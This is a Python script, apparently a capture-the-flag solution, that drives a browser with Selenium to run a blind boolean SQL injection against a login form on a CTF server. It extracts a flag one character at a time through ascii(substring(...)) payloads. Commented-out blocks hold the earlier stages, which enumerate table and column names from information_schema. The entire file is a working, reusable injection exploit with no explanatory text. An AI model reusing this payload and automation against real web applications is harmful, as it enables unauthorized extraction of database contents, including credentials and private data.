from selenium import webdriver
from bs4 import BeautifulSoup
import re

driver = webdriver.Chrome('chromedriver.exe')
driver.get('http://ctf.adl.csie.ncu.edu.tw:9487/')
flag = "AD:{"
current = ""
end = 0
none = 1

for item in range(4, 50):
            
    for char in range(32, 127):

        none = 1    
        user = driver.find_element_by_name('user')
        payload = '\' or ascii(substring((SELECT adl from flag limit 0,1),%d,1)) = %d#'
        user.send_keys(payload % (item, char))
        current = chr(char)
        user.submit()

        pageSource = driver.page_source
        soup = BeautifulSoup(pageSource, 'html.parser')
        result = soup.select('h3')[0].get_text()
        find = re.search('Successful', result)
            
        if find:
            flag += current
            print("Find:" + flag)
            if current == '}':
                end = 1  
            driver.back()
            user = driver.find_element_by_name('user')
            user.clear()
            none = 0
            break
        
        driver.back()
        user = driver.find_element_by_name('user')
        user.clear()

    if end == 1 or none == 1:
        break



# Find column where Table= flag
''' 
driver = webdriver.Chrome('chromedriver.exe')
driver.get('http://ctf.adl.csie.ncu.edu.tw:9487/')
flag = "AD:{"
current = ""
end = 0
none = 1

for item in range(1, 50):
            
    for char in range(32, 127):

        none = 1    
        user = driver.find_element_by_name('user')
        payload = '\' or ascii(substring((SELECT COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME="flag" limit 0,1),%d,1)) = %d#'
        user.send_keys(payload % (item, char))
        current = chr(char)
        user.submit()

        pageSource = driver.page_source
        soup = BeautifulSoup(pageSource, 'html.parser')
        result = soup.select('h3')[0].get_text()
        find = re.search('Successful', result)
            
        if find:
            flag += current
            print("Find:" + flag)
            if current == '}':
                end = 1  
            driver.back()
            user = driver.find_element_by_name('user')
            user.clear()
            none = 0
            break
        
        driver.back()
        user = driver.find_element_by_name('user')
        user.clear()

    if end == 1 or none == 1:
        break
'''

# Find Table where Table Type = Base Table
''' 
driver = webdriver.Chrome('chromedriver.exe')
driver.get('http://ctf.adl.csie.ncu.edu.tw:9487/')
flag = "AD:{"
current = ""
end = 0
none = 1

for item in range(1, 50):
            
    for char in range(32, 127):

        none = 1    
        user = driver.find_element_by_name('user')
        payload = '\' or ascii(substring((SELECT table_name from information_schema.tables where TABLE_TYPE = "BASE TABLE" limit 0, 1), %d, 1)) = %d#'
        user.send_keys(payload % (item, char))
        current = chr(char)
        user.submit()

        pageSource = driver.page_source
        soup = BeautifulSoup(pageSource, 'html.parser')
        result = soup.select('h3')[0].get_text()
        find = re.search('Successful', result)
            
        if find:
            flag += current
            print("Find:" + flag)
            if current == '}':
                end = 1  
            driver.back()
            user = driver.find_element_by_name('user')
            user.clear()
            none = 0
            break
        
        driver.back()
        user = driver.find_element_by_name('user')
        user.clear()

    if end == 1 or none == 1:
        break
'''
